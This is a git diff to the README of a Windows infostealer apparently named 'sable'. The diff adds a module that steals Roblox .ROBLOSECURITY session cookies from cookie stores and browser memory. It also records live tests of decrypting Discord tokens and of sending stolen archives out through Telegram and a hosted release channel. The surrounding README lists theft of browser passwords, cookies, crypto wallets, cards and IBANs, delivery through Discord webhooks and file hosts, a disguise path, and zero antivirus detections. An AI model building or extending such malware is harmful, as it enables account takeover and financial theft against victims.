@@ -18,7 +18,7 @@ A Windows information gatherer with two halves:
 `core/` holds what both halves need and what neither owns: the schema, the seal, the
 forge, the validator, the pipeline.
 
-51 files. The manifest is the spec and a test enforces it in both directions.
+52 files. The manifest is the spec and a test enforces it in both directions.
 
 ## What it does
 
@@ -28,6 +28,7 @@ forge, the validator, the pipeline.
 | `network` | adapters, hardware addresses, link state, and one geolocation lookup |
 | `displays` | monitors and their geometries |
 | `browsers` | the whole profile folder, plus decrypted passwords, cookies, history, downloads, bookmarks |
+| `roblox` | the `.ROBLOSECURITY` session cookie, from the cookie stores and from live browser memory |
 | `sessions` | browser session tokens, Discord tokens |
 | `wallets` | extension wallets and their encrypted vaults |
 | `autofill` | saved form entries, cards, addresses, IBANs |
@@ -72,7 +73,7 @@ fused build puts the payload behind `fused/` under a 64 MiB ceiling.
 
 `HANDOFF.md` §5 is the full list. The short version:
 
-- 352 Python tests, `ruff` clean, `compileall` clean.
+- 359 Python tests, `ruff` clean, `compileall` clean.
 - Forge, validate, pipeline, widgets, whole window and frozen launcher suites, plus the
   contract tests that pin the helper flag, the disguise path and the category split.
 - Live: Discord webhooks, the `.py` artifact, catbox and litterbox, gofile fallback,
@@ -100,6 +101,18 @@ fused build puts the payload behind `fused/` under a 64 MiB ceiling.
   same day, executed the artifact as a double-click and again elevated. Two deliveries,
   71,704 and 71,702 bytes, 22 members each, opened with the seal key. Zero detections on
   both; the EICAR control on the same box was caught in eight seconds with event 1116.
+- **Sessions, in the guest, through the artifact.** `.ROBLOSECURITY` read both ways:
+  store mode 216 B exact with the memory half skipped, memory mode 248 B exact out of a
+  single `chrome.exe` whose profile held no row. The Discord token comes out of
+  `Local Storage\leveldb` through DPAPI + AES-GCM and lands in `discord_session.txt` at
+  88 B exact in both modes, with `sessions.json` reading `encrypted: true` — the fixture
+  plants ciphertext only, so the decrypt ran.
+- **Both live channels, twice each.** Telegram: in-process `message_id 3`, then the
+  packaged artifact landed id 4 (proved by a probe after it returning id 5) in chat
+  `8091562135`, 104,289 B. Phantom: release `sable-20261122-095313-decc` pointing at a
+  hosted copy whose sha256 matched the local archive byte for byte, then the artifact's own
+  release `sable-20261122-095416-4295`. Cleanup after both: artifact gone, no `.old`, no
+  queue, no staged copy.
 - The archive opens in 7-Zip with the key and fails every entry without it.
 - Rust crate `native/aes` agrees with the Python formats in both directions, 21/21.
 
@@ -151,7 +164,7 @@ fused build puts the payload behind `fused/` under a 64 MiB ceiling.
 ```powershell
 $py = "C:\Users\Kuzenee\AppData\Local\Temp\opencode\py312\python.exe"
 cd sable
-& $py -m pytest -q            # 352
+& $py -m pytest -q            # 359
 & $py -m app.main             # the window
 ```
 
@@ -163,7 +176,7 @@ The frozen launcher is built once and reused by every artifact:
 
 Output: `tools/dist/sable-launcher.exe`, 37/37 on `_harness/sable_launcher.py`.
 
-A fresh `git archive` of the tag runs 350 passed and 2 skipped: the two frozen-launcher
+A fresh `git archive` of the tag runs 357 passed and 2 skipped: the two frozen-launcher
 cases skip because `tools/dist` is a build output and is not checked in.
 
 The native crate is separate and not required to build an artifact:
